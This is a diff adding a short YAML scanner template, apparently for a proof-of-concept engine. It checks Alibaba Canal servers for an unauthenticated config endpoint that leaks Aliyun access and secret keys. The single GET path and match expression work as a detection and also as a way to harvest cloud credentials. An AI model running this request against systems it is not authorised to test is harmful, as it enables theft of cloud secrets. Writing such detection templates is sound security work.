@@ -1,0 +1,18 @@
+id: alibaba-canal-info-leak
+
+info:
+    name: alibaba-canal-info-leak
+    author: Aquilao(https://github.com/Aquilao)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /api/v1/canal/config/1/1
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"ncanal.aliyun.accessKey") && response.body.bcontains(b"ncanal.aliyun.secretKey")
+expression: r0()
